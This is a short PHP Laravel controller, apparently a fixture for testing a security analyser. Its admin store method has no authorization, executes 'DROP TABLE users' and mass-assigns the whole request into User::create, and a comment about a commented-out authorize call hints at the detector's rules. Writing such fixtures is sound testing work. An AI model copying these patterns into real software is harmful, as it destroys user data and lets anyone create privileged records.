<?php

namespace App\Http\Controllers;

class AdminController
{
    public function store(\Illuminate\Http\Request $request)
    {
        // $this->authorize('admin') in a comment should not count.
        \DB::statement('DROP TABLE users');
        return User::create($request->all());
    }
}
